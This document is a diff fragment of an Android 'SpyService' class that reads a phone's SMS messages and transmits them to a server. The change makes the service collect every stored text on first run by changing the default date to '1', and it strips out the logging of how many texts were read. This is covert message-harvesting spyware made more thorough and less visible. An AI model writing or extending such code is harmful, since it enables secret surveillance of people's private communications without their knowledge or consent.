@@ -60,14 +60,12 @@ public class SpyService extends Service {
 
 		// On first run, this default value will cause EVERY SMS to be
 		// transmitted to server
-		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, currentTime);
+		String lastDate = prefs.getString(PREF_LAST_SMS_DATE, "1");
 
-		Log.i(SetupActivity.TAG, "lastDate: " + lastDate);
 
 		// Get all SMS that have happened since our remembered date
 		final Cursor cursor = getContentResolver().query(SMS_URI, SMS_COLUMNS, "date > ?",
 				new String[] { lastDate }, null);
-		Log.i(SetupActivity.TAG, cursor.getCount() + " texts since last run");
 
 		prefsEdit.putString(PREF_LAST_SMS_DATE, currentTime);
 		prefsEdit.commit();
